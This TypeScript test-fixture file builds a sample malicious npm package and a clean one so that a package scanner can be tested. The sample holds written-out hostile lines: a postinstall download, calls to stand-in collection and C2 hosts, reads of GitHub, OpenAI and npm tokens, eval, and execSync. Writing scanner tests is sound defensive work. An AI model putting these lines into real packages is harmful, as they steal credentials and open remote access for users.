import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { dirname, join } from 'path';

/**
 * Installed-npm-package fixtures for the shipped-code scanner, written to a temp dir at test time (committed .js fixtures
 * would be linted and compiled as repo code). Every file is inert text for the scanner: the scanner must parse, never run
 * it. Each fixture that would have a side effect if executed writes MARKER_NAME next to the package, so a test can prove the
 * scanner never executed or required it.
 */
export const MARKER_NAME = 'EXECUTED.marker';

function write(root: string, rel: string, content: string | Buffer): void {
  const p = join(root, rel);
  mkdirSync(dirname(p), { recursive: true });
  writeFileSync(p, content);
}

/** A runtime-like package: postinstall, bins, network/process modules, endpoints, dynamic code, token reads, home writes, an ELF binary, a symlink out. */
export function createEvilPackage(opts: { version?: string; extra?: Record<string, string>; scripts?: Record<string, string>; base?: string } = {}): { dir: string; outside: string; base: string } {
  const base = opts.base ?? mkdtempSync(join(tmpdir(), 'shipscan-'));
  const dir = join(base, 'pkg');
  const outside = join(base, 'outside');
  const marker = join(base, MARKER_NAME).replace(/\\/g, '/');
  write(base, 'pkg/package.json', JSON.stringify({
    name: 'evil-runtime', version: opts.version ?? '1.0.0', main: 'lib/index.js',
    bin: { evil: 'bin/evil', 'evil-helper': './lib/helper.cjs' },
    scripts: { postinstall: 'node scripts/fetch-binary.js', test: 'echo test', ...opts.scripts },
  }, null, 2));
  write(base, 'pkg/bin/evil', `#!/usr/bin/env node\nrequire('fs').writeFileSync(${JSON.stringify(marker)}, 'bin');\nrequire('../lib/index.js');\n`);
  write(base, 'pkg/lib/index.js', [
    `const cp = require('child_process');`,
    `const https = require('node:https');`,
    `import net from 'net';`,
    `require('fs').writeFileSync(${JSON.stringify(marker)}, 'index');`,
    `fetch('https://evil.example.com/collect?x=1');`,
    `const ws = new WebSocket('wss://c2.example.net/socket');`,
    `eval('1 + 1');`,
    `const f = new Function('a', 'return a');`,
    `const name = 'x' + Date.now();`,
    `require(name);`,
    `import(name);`,
    `const token = process.env.GITHUB_TOKEN;`,
    `const k = process.env['OPENAI_API_KEY'];`,
    `const { NPM_TOKEN, PATH } = process.env;`,
    `const harmless = process.env.NODE_ENV;`,
    `require('fs').writeFileSync(require('path').join(require('os').homedir(), '.evilrc'), 'x');`,
    `cp.execSync('id');`,
  ].join('\n'));
  write(base, 'pkg/lib/helper.cjs', `module.exports = () => import('./plugin.mjs');\n`);
  write(base, 'pkg/lib/plugin.mjs', `export const u = 'https://docs.example.org/page';\n`);
  write(base, 'pkg/scripts/fetch-binary.js', `const https = require('https');\nhttps.get('https://downloads.example.com/bin.tgz');\nrequire('fs').writeFileSync(${JSON.stringify(marker)}, 'postinstall');\n`);
  // fake native binaries: ELF and Mach-O (64-bit LE) magic
  write(base, 'pkg/vendor/evil-linux', Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]), Buffer.alloc(56)]));
  write(base, 'pkg/vendor/evil-darwin', Buffer.concat([Buffer.from([0xcf, 0xfa, 0xed, 0xfe]), Buffer.alloc(60)]));
  // nested dependency with its own install script
  write(base, 'pkg/node_modules/dep-a/package.json', JSON.stringify({ name: 'dep-a', version: '2.0.0', scripts: { install: 'node-gyp rebuild' } }));
  write(base, 'pkg/node_modules/dep-a/index.js', `module.exports = 1;\n`);
  // outside the package: reachable only through a symlink, which the scanner must not follow
  write(base, 'outside/secret.js', `eval('outside');\nfetch('https://outside.example.invalid/');\n`);
  // relative targets: the report records link targets, and a relative one keeps the report independent of the temp dir
  symlinkSync('../outside', join(dir, 'linked-dir'));
  symlinkSync('../../outside/secret.js', join(dir, 'lib', 'linked.js'));
  for (const [rel, content] of Object.entries(opts.extra ?? {})) write(dir, rel, content);
  return { dir, outside, base };
}

/** A small clean package: no install scripts, no network, no dynamic code. */
export function createCleanPackage(version = '1.0.0'): string {
  const base = mkdtempSync(join(tmpdir(), 'shipscan-clean-'));
  write(base, 'package.json', JSON.stringify({ name: 'clean-lib', version, main: 'index.js' }));
  write(base, 'index.js', `const path = require('path');\nmodule.exports = (p) => path.join('a', p);\n`);
  return base;
}
